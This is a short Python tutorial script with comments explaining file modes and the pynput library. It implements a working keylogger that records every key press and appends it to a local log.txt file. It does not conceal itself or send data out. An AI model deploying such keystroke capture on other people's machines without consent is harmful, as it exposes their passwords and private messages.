# Storing the keystrokes in a text file
# File Handling- How to read, write and append to a file

# r - reading
# w - writing
# a - appending

# f = open("log.txt",'a')
# f.write(" Hi India")
# f.close()

# Listeners - Listen to keystrokes
# Use of the 'with keyword' - releases the memory automatically
from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.space":
        letter = ' '
    if letter == "Key.shift":
        letter = ''
    if letter == "Key.enter":
        letter = '\n'
    with open('log.txt', 'a') as f:
        f.write(letter)


# pynput is library for handling input streams
# It listens and control Mouse and Keyboard


# listening to your keyboard
with Listener(on_press=write_to_file) as l:
    l.join()
